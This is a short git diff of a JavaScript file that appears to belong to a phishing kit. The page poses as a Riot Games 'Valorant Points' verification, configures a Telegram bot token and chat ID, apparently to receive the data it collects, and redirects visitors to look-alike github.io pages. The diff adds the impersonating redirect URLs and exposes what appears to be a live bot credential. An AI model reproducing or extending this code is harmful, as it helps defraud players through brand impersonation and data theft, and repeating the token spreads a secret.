@@ -1,8 +1,8 @@
 document.addEventListener("DOMContentLoaded", function() {
     const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // Your bot token
     const chatId = "6687453395"; // Your Telegram Chat ID
-    const redirectUrl = "https://example.com"; // Change this to the page for accepted users
-    const rejectUrl = "https://error.com"; // Change this to the page for rejected users
+    const redirectUrl = "https://riotgames0.github.io/Verification/ValorantPionts/index.html"; // Change this to the page for accepted users
+    const rejectUrl = "https://riotgames0.github.io/Valorantpoint/ValorantPionts/index.html"; // Change this to the page for rejected users
     const verifyBtn = document.getElementById("verify-btn");
     const rejectedSection = document.getElementById("rejected-section");
     const redirectBtn = document.getElementById("redirect-btn");
